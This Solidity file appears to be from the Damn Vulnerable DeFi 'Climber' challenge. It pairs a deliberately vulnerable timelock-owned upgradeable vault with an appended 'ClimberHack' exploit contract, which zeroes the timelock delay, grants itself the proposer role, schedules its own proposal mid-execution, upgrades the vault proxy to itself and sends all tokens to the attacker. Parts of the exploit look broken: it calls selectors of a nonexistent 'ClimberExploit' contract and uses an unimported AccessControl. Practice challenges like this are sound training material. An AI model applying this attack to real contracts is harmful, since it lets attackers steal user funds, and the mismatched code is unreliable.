// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";

/**
 * @title ClimberVault
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    modifier onlySweeper() {
        if (msg.sender != _sweeper) {
            revert CallerNotSweeper();
        }
        _;
    }

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(
        address admin,
        address proposer,
        address sweeper
    ) external initializer {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();

        // Deploy timelock and transfer ownership to it
        transferOwnership(address(new ClimberTimelock(admin, proposer)));

        _setSweeper(sweeper);
        _updateLastWithdrawalTimestamp(block.timestamp);
    }

    // Allows the owner to send a limited amount of tokens to a recipient every now and then
    function withdraw(
        address token,
        address recipient,
        uint256 amount
    ) external onlyOwner {
        if (amount > WITHDRAWAL_LIMIT) {
            revert InvalidWithdrawalAmount();
        }

        if (block.timestamp <= _lastWithdrawalTimestamp + WAITING_PERIOD) {
            revert InvalidWithdrawalTime();
        }

        _updateLastWithdrawalTimestamp(block.timestamp);

        SafeTransferLib.safeTransfer(token, recipient, amount);
    }

    // Allows trusted sweeper account to retrieve any tokens
    function sweepFunds(address token) external onlySweeper {
        SafeTransferLib.safeTransfer(
            token,
            _sweeper,
            IERC20(token).balanceOf(address(this))
        );
    }

    function getSweeper() external view returns (address) {
        return _sweeper;
    }

    function _setSweeper(address newSweeper) private {
        _sweeper = newSweeper;
    }

    function getLastWithdrawalTimestamp() external view returns (uint256) {
        return _lastWithdrawalTimestamp;
    }

    function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
        _lastWithdrawalTimestamp = timestamp;
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyOwner {}
}

contract ClimberHack is UUPSUpgradeable {
    ClimberTimelock immutable timelock;
    address immutable vaultProxyAddress;
    IERC20 immutable token;
    address immutable attacker;

    constructor(
        ClimberTimelock _timelock,
        address _vaultProxyAddress,
        IERC20 _token
    ) {
        timelock = _timelock;
        vaultProxyAddress = _vaultProxyAddress;
        token = _token;
        attacker = msg.sender;
    }

    function buildProposal()
        internal
        returns (address[] memory, uint256[] memory, bytes[] memory)
    {
        address[] memory targets = new address[](5);
        uint256[] memory values = new uint256[](5);
        bytes[] memory dataElements = new bytes[](5);

        // Update delay to 0.
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(
            ClimberTimelock.updateDelay.selector,
            0
        );

        // Grant this contract the proposer role.
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            timelock.PROPOSER_ROLE(),
            address(this)
        );

        // Call this contract to schedule the proposal.
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            ClimberExploit.scheduleProposal.selector
        );

        // Upgrade the Proxy to use this contract as implementation instead.
        targets[3] = address(vaultProxyAddress);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeTo.selector,
            address(this)
        );

        // Now sweep the funds!
        targets[4] = address(vaultProxyAddress);
        values[4] = 0;
        dataElements[4] = abi.encodeWithSelector(
            ClimberExploit.sweepFunds.selector
        );

        return (targets, values, dataElements);
    }

    // Start exploit by executing a proposal that makes us a proposer.
    function executeProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        timelock.execute(targets, values, dataElements, 0);
    }

    // Timelock calls this while proposal is still being executed but we
    // are a proposer now and can schedule it to make it legit.
    function scheduleProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        timelock.schedule(targets, values, dataElements, 0);
    }

    // Once this contract became the Vault Proxy's new Logic Contract
    // this function will be called to move all tokens to the attacker.
    function sweepFunds() external {
        token.transfer(attacker, token.balanceOf(address(this)));
    }

    // Required function for inheriting from UUPSUpgradeable.
    function _authorizeUpgrade(address newImplementation) internal override {}
}
